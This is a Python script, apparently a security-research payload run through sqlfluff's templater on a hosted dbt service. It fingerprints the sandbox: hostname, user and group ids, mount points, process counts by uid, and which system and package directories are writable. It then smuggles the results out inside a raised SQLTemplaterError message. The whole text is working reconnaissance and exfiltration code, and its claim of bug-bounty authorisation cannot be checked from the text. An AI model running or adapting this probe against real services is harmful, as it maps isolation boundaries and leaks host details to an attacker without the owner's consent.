MARKER = 'A145F9_NEGCTL_1B2047C13A46'

def _safe_uid(p):
    try:
        return os.stat(p).st_uid
    except Exception:
        return -1
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1, safe harbour).
Reads process-local directory NAMES, and the content of files whose names
this researcher chose and planted. No environment variables, no network,
no instance metadata, no credentials, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
HOLD = 20
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

try:
    out["host"] = __import__("socket").gethostname()
    out["uid"] = os.getuid()
    out["gid"] = os.getgid()
    now = time.time()
    for lbl, path in (("root", "/"), ("tmp", "/tmp"), ("jobs", "/tmp/jobs")):
        try:
            s = os.stat(path)
            out["id_" + lbl] = [s.st_dev, s.st_ino, int(now - s.st_mtime)]
        except Exception as exc:
            out["id_" + lbl] = "ERR:" + type(exc).__name__
    try:
        mts = []
        with open("/proc/self/mountinfo") as fh:
            for ln in fh:
                f = ln.split()
                try:
                    sep = f.index("-")
                    mts.append([f[4], f[sep + 1]])
                except Exception:
                    continue
        out["n_mounts"] = len(mts)
        out["mount_points"] = sorted(set(m[0] for m in mts))[:30]
    except Exception as exc:
        out["mounts_err"] = type(exc).__name__
    try:
        me = os.getuid()
        pids = [e for e in os.listdir("/proc") if e.isdigit()]
        mine_n = sum(1 for p in pids if _safe_uid("/proc/" + p) == me)
        out["n_pids"] = len(pids)
        out["n_pids_own_uid"] = mine_n
        out["n_pids_other_uid"] = len(pids) - mine_n
    except Exception as exc:
        out["proc_err"] = type(exc).__name__
    probe = ["/", "/tmp", "/tmp/jobs", "/etc", "/venv", "/usr/lib", "/home"]
    try:
        import sqlfluff as _sf
        probe.append(os.path.dirname(_sf.__file__))
        out["sqlfluff"] = getattr(_sf, "__version__", "?")
    except Exception:
        pass
    out["w_ok"] = [[q[-44:], 1 if os.access(q, os.W_OK) else 0,
                    1 if os.path.isdir(q) else 0] for q in probe]
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
